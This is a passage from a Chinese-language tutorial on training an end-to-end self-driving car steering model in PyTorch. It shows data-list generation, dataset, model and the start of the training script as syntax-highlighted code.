class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入系统库</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">creat_data_list</span>(<span class="params">dataset_path, file_list, mode=<span class="string">&#x27;train&#x27;</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    创建txt文件列表</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(dataset_path, (mode + <span class="string">&#x27;.txt&#x27;</span>)), <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> (imgpath, angle) <span class="keyword">in</span> file_list:</span><br><span class="line">            f.write(imgpath + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(angle) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(mode + <span class="string">&#x27;.txt 已生成&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getFileList</span>(<span class="params"><span class="built_in">dir</span>, Filelist, ext=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    获取文件夹及其子文件夹中文件列表</span></span><br><span class="line"><span class="string">    输入 dir: 文件夹根目录</span></span><br><span class="line"><span class="string">    输入 ext: 扩展名</span></span><br><span class="line"><span class="string">    返回: 文件路径列表</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    newDir = <span class="built_in">dir</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(<span class="built_in">dir</span>):</span><br><span class="line">        <span class="keyword">if</span> ext <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            Filelist.append(<span class="built_in">dir</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> ext <span class="keyword">in</span> <span class="built_in">dir</span>[-<span class="number">3</span>:]:</span><br><span class="line">                Filelist.append(<span class="built_in">dir</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">elif</span> os.path.isdir(<span class="built_in">dir</span>):</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> os.listdir(<span class="built_in">dir</span>):</span><br><span class="line">            newDir = os.path.join(<span class="built_in">dir</span>, s)</span><br><span class="line">            getFileList(newDir, Filelist, ext)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> Filelist</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    主函数</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 设置参数</span></span><br><span class="line">    org_img_folder = <span class="string">&#x27;./data/simulate&#x27;</span>  <span class="comment"># 数据集根目录</span></span><br><span class="line">    train_ratio = <span class="number">0.8</span>  <span class="comment"># 训练集占比</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 检索jpg文件</span></span><br><span class="line">    jpglist = getFileList(org_img_folder, [], <span class="string">&#x27;jpg&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;本次执行检索到 &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(jpglist)) + <span class="string">&#x27; 个jpg文件\n&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">    file_list = <span class="built_in">list</span>()</span><br><span class="line">    <span class="comment"># 解析转向值</span></span><br><span class="line">    <span class="keyword">for</span> jpgpath <span class="keyword">in</span> jpglist:</span><br><span class="line">        <span class="built_in">print</span>(jpgpath)</span><br><span class="line">        curDataDir = os.path.dirname(jpgpath)</span><br><span class="line">        basename = os.path.basename(jpgpath)</span><br><span class="line">        angle = (basename[:-<span class="number">4</span>]).split(<span class="string">&#x27;_&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">        imgPath = os.path.join(curDataDir, basename).replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">        file_list.append((imgPath, angle))</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 切分数据</span></span><br><span class="line">    random.seed(<span class="number">256</span>)</span><br><span class="line">    random.shuffle(file_list)</span><br><span class="line">    train_num = <span class="built_in">int</span>(<span class="built_in">len</span>(file_list) * train_ratio)</span><br><span class="line">    train_list = file_list[<span class="number">0</span>:train_num]</span><br><span class="line">    val_list = file_list[train_num:]</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 创建列表文件</span></span><br><span class="line">    creat_data_list(org_img_folder, train_list, mode=<span class="string">&#x27;train&#x27;</span>)</span><br><span class="line">    creat_data_list(org_img_folder, val_list, mode=<span class="string">&#x27;val&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    程序入口</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>上述代码我们查找每个log文件夹下的jpg文件，然后解析出对应的转向值。将这些值最后分别保存到train.txt和val.txt文件中。在代码里面，我们设定训练集占比0.8，剩下的0.2则为验证集。</p><p>生成的train.txt和val.txt文件每行内容表示一个样本，由图片路径和转向值组成，中间用空格隔开。</p><p>接下来我们将使用Pytoch框架实现深度学习算法进行训练、验证。 </p><h3 id="3-3模型训练"><a href="#3-3模型训练" class="headerlink" title="3.3模型训练"></a>3.3模型训练</h3><p> 首先定义数据采集器datasets.py，代码如下： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入系统库</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 导入PyTorch库</span></span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> Dataset</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AutoDriveDataset</span>(<span class="title class_ inherited__">Dataset</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    数据集加载器</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, data_folder, mode, transform=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :参数 data_folder: # 数据文件所在文件夹根路径(train.txt和val.txt所在文件夹路径)</span></span><br><span class="line"><span class="string">        :参数 mode: &#x27;train&#x27; 或者 &#x27;val&#x27;</span></span><br><span class="line"><span class="string">        :参数 normalize_type: 图像归一化处理方式</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line">        self.data_folder = data_folder</span><br><span class="line">        self.mode = mode.lower()</span><br><span class="line">        self.transform = transform</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">assert</span> self.mode <span class="keyword">in</span> &#123;<span class="string">&#x27;train&#x27;</span>, <span class="string">&#x27;val&#x27;</span>&#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 读取图像列表路径</span></span><br><span class="line">        <span class="keyword">if</span> self.mode == <span class="string">&#x27;train&#x27;</span>:</span><br><span class="line">            file_path=os.path.join(data_folder, <span class="string">&#x27;train.txt&#x27;</span>)            </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            file_path=os.path.join(data_folder, <span class="string">&#x27;val.txt&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        self.file_list=<span class="built_in">list</span>()      </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            files = f.readlines()</span><br><span class="line">            <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">                <span class="keyword">if</span> file.strip() <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                self.file_list.append([file.split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>],<span class="built_in">float</span>(file.split(<span class="string">&#x27; &#x27;</span>)[<span class="number">1</span>])])</span><br><span class="line">                </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, i</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :参数 i: 图像检索号</span></span><br><span class="line"><span class="string">        :返回: 返回第i个图像和标签</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 读取图像</span></span><br><span class="line">        img = cv2.imread(self.file_list[i][<span class="number">0</span>])</span><br><span class="line">        img = cv2.cvtColor(img,cv2.COLOR_BGR2HSV)</span><br><span class="line">        <span class="keyword">if</span> self.transform:</span><br><span class="line">            img = self.transform(img)</span><br><span class="line">        <span class="comment"># 读取标签</span></span><br><span class="line">        label = self.file_list[i][<span class="number">1</span>]</span><br><span class="line">        label = torch.from_numpy(np.array([label])).<span class="built_in">float</span>()</span><br><span class="line">        <span class="keyword">return</span> img, label</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__len__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        为了使用PyTorch的DataLoader,必须提供该方法.</span></span><br><span class="line"><span class="string">        :返回: 加载的图像总数</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(self.file_list)</span><br></pre></td></tr></table></figure><p>上述代码比较简单，我们构造了AutoDriveDataset类用于作为自动驾驶小车数据读取类，从train.txt和val.txt中根据每行内容得到每个样本的图像路径和对应的真值标签。这里需要注意下颜色空间，我们最终是使用HSV空间进行训练的，因此需要做一下转化。</p><p>这里插播一下一个自定义的方法库utils.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AverageMeter</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    平均器类,用于计算平均值、总和</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.reset()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">reset</span>(<span class="params">self</span>):</span><br><span class="line">        self.val = <span class="number">0</span></span><br><span class="line">        self.avg = <span class="number">0</span></span><br><span class="line">        self.<span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">        self.count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">self, val, n=<span class="number">1</span></span>):</span><br><span class="line">        self.val = val</span><br><span class="line">        self.<span class="built_in">sum</span> += val * n</span><br><span class="line">        self.count += n</span><br><span class="line">        self.avg = self.<span class="built_in">sum</span> / self.count</span><br></pre></td></tr></table></figure><p>虽然这个文件里面只有一个类，但创建这样一个文件是习惯。</p><p>有了数据读取类以后我们就下来定义模型，具体代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入PyTorch库</span></span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AutoDriveNet</span>(nn.Module):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    端到端自动驾驶模型</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        初始化</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">super</span>(AutoDriveNet, self).__init__()</span><br><span class="line">        self.conv_layers = nn.Sequential(nn.Conv2d(<span class="number">3</span>, <span class="number">24</span>, <span class="number">5</span>, stride=<span class="number">2</span>),</span><br><span class="line">                                         nn.ELU(),</span><br><span class="line">                                         nn.Conv2d(<span class="number">24</span>, <span class="number">36</span>, <span class="number">5</span>, stride=<span class="number">2</span>),</span><br><span class="line">                                         nn.ELU(),</span><br><span class="line">                                         nn.Conv2d(<span class="number">36</span>, <span class="number">48</span>, <span class="number">5</span>, stride=<span class="number">2</span>),</span><br><span class="line">                                         nn.ELU(), nn.Conv2d(<span class="number">48</span>, <span class="number">64</span>, <span class="number">3</span>),</span><br><span class="line">                                         nn.ELU(), nn.Conv2d(<span class="number">64</span>, <span class="number">64</span>, <span class="number">3</span>),</span><br><span class="line">                                         nn.Dropout(<span class="number">0.5</span>))</span><br><span class="line">        self.linear_layers = nn.Sequential(</span><br><span class="line">            <span class="comment">#nn.Linear(in_features=64 * 2 * 33, out_features=100),</span></span><br><span class="line">            nn.Linear(in_features=<span class="number">64</span> * <span class="number">8</span> * <span class="number">13</span>, out_features=<span class="number">100</span>),</span><br><span class="line">            nn.ELU(),</span><br><span class="line">            nn.Linear(in_features=<span class="number">100</span>, out_features=<span class="number">50</span>),</span><br><span class="line">            nn.ELU(),</span><br><span class="line">            nn.Linear(in_features=<span class="number">50</span>, out_features=<span class="number">10</span>),</span><br><span class="line">            nn.Linear(in_features=<span class="number">10</span>, out_features=<span class="number">1</span>))</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, <span class="built_in">input</span></span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        前向推理</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">input</span> = <span class="built_in">input</span>.view(<span class="built_in">input</span>.size(<span class="number">0</span>), <span class="number">3</span>, <span class="number">120</span>, <span class="number">160</span>)</span><br><span class="line">        output = self.conv_layers(<span class="built_in">input</span>)</span><br><span class="line">        output = output.view(output.size(<span class="number">0</span>), -<span class="number">1</span>)</span><br><span class="line">        output = self.linear_layers(output)</span><br><span class="line">        <span class="keyword">return</span> output</span><br></pre></td></tr></table></figure><p>这里需要注意的是我们的模型跟论文里的稍微有点不一样(见下)，主要是因为我们的图像尺寸是120x160的，而论文里使用的是66x200。因此，我们对应的输入需要调整下，另外，在最后全连接层也相应的在维度上要调整。对于实际项目来说，现在很多的摄像头都是使用3:4分辨率的，例如树莓派摄像头典型的分辨率是480x640，因此，修改过后的模型更具有普遍性，还方便后面迁移到真实环境训练。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">self.conv_layers = nn.Sequential(nn.Conv2d(<span class="number">3</span>, <span class="number">24</span>, <span class="number">5</span>, stride=<span class="number">2</span>),</span><br><span class="line">                                         nn.ELU(),</span><br><span class="line">                                         nn.Conv2d(<span class="number">24</span>, <span class="number">36</span>, <span class="number">5</span>, stride=<span class="number">2</span>),</span><br><span class="line">                                         nn.ELU(),</span><br><span class="line">                                         nn.Conv2d(<span class="number">36</span>, <span class="number">48</span>, <span class="number">5</span>, stride=<span class="number">2</span>),</span><br><span class="line">                                         nn.ELU(), nn.Conv2d(<span class="number">48</span>, <span class="number">64</span>, <span class="number">3</span>),</span><br><span class="line">                                         nn.ELU(), nn.Conv2d(<span class="number">64</span>, <span class="number">64</span>, <span class="number">3</span>),</span><br><span class="line">                                         nn.Dropout(<span class="number">0.5</span>))</span><br><span class="line">self.linear_layers = nn.Sequential(</span><br><span class="line">            <span class="comment">#nn.Linear(in_features=64 * 2 * 33, out_features=100),</span></span><br><span class="line">            nn.Linear(in_features=<span class="number">64</span> * <span class="number">8</span> * <span class="number">13</span>, out_features=<span class="number">100</span>),</span><br><span class="line">            nn.ELU(),</span><br><span class="line">            nn.Linear(in_features=<span class="number">100</span>, out_features=<span class="number">50</span>),</span><br><span class="line">            nn.ELU(),</span><br><span class="line">            nn.Linear(in_features=<span class="number">50</span>, out_features=<span class="number">10</span>),</span><br><span class="line">            nn.Linear(in_features=<span class="number">10</span>, out_features=<span class="number">1</span>))                                         </span><br></pre></td></tr></table></figure><p>整个模型比较简单，前面是多个cnn，最后接几个全连接网络，输入是3通道图像，输出是一个转向回归值。</p><p>训练脚本代码train.py如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入torch库</span></span><br><span class="line"><span class="keyword">import</span> torch.backends.cudnn <span class="keyword">as</span> cudnn</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn</span><br><span class="line"><span class="keyword">import</span> torchvision.transforms <span class="keyword">as</span> transforms</span><br><span class="line"><span class="keyword">from</span> torch.utils.tensorboard <span class="keyword">import</span> SummaryWriter</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入自定义库</span></span><br><span class="line"><span class="keyword">from</span> models <span class="keyword">import</span> AutoDriveNet</span><br><span class="line"><span class="keyword">from</span> datasets <span class="keyword">import</span> AutoDriveDataset</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    训练.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 数据集路径</span></span><br><span class="line">    data_folder = <span class="string">&#x27;./data/simulate&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 学习参数</span></span><br><span class="line">    checkpoint = <span class="literal">None</span>  <span class="comment"># 预训练模型路径，如果不存在则为None</span></span><br><span class="line">    <span class="comment"># checkpoint = &quot;./results/checkpoint.pth&quot;</span></span><br><span class="line">    batch_size = <span class="number">400</span>  <span class="comment"># 批大小</span></span><br><span class="line">    start_epoch = <span class="number">1</span>  <span class="comment"># 轮数起始位置</span></span><br><span class="line">    epochs = <span class="number">1000</span>  <span class="comment"># 迭代轮数</span></span><br><span class="line">    lr = <span class="number">1e-4</span>  <span class="comment"># 学习率</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设备参数</span></span><br><span class="line">    device = torch.device(<span class="string">&quot;cuda&quot;</span> <span class="keyword">if</span> torch.cuda.is_available() <span class="keyword">else</span> <span class="string">&quot;cpu&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(torch.cuda.is_available(), device)</span><br><span class="line">    <span class="comment">#ngpu = 4  # 用来运行的gpu数量</span></span><br><span class="line">    cudnn.benchmark = <span class="literal">True</span>  <span class="comment"># 对卷积进行加速</span></span><br><span class="line">    writer = SummaryWriter()  <span class="comment"># 实时监控     使用命令 tensorboard --logdir runs  进行查看</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 初始化模型</span></span><br><span class="line">    model = AutoDriveNet()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 初始化优化器</span></span><br><span class="line">    optimizer = torch.optim.Adam(params=<span class="built_in">filter</span>(<span class="keyword">lambda</span> p: p.requires_grad,</span><br><span class="line">                                               model.parameters()),</span><br><span class="line">                                 lr=lr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 迁移至默认设备进行训练</span></span><br><span class="line">    model = model.to(device)</span><br><span class="line">    model = model.cuda()</span><br><span class="line">    criterion = nn.MSELoss().to(device)</span><br><span class="line">    criterion = nn.MSELoss().cuda()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 加载预训练模型</span></span><br><span class="line">    <span class="keyword">if</span> checkpoint <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        checkpoint = torch.load(checkpoint)</span><br><span class="line">        start_epoch = checkpoint[<span class="string">&#x27;epoch&#x27;</span>] + <span class="number">1</span></span><br><span class="line">        model.load_state_dict(checkpoint[<span class="string">&#x27;model&#x27;</span>])</span><br><span class="line">        optimizer.load_state_dict(checkpoint[<span class="string">&#x27;optimizer&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 单机多卡训练</span></span><br><span class="line">    <span class="comment"># if torch.cuda.is_available():</span></span><br><span class="line">    <span class="comment">#   model = nn.DataParallel(model, device_ids=list(range(ngpu)))</span></span><br><span class="line">    <span class="comment">#   model = nn.DataParallel(model, device_ids=[0])</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定制化的dataloader</span></span><br><span class="line">    transformations = transforms.Compose([</span><br><span class="line">        transforms.ToTensor(),  <span class="comment"># 通道置前并且将0-255RGB值映射至0-1</span></span><br><span class="line">        <span class="comment"># transforms.Normalize(</span></span><br><span class="line">        <span class="comment">#     mean=[0.485, 0.456, 0.406],  # 归一化至[-1,1] mean std 来自imagenet 计算</span></span><br><span class="line">        <span class="comment">#     std=[0.229, 0.224, 0.225])</span></span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">    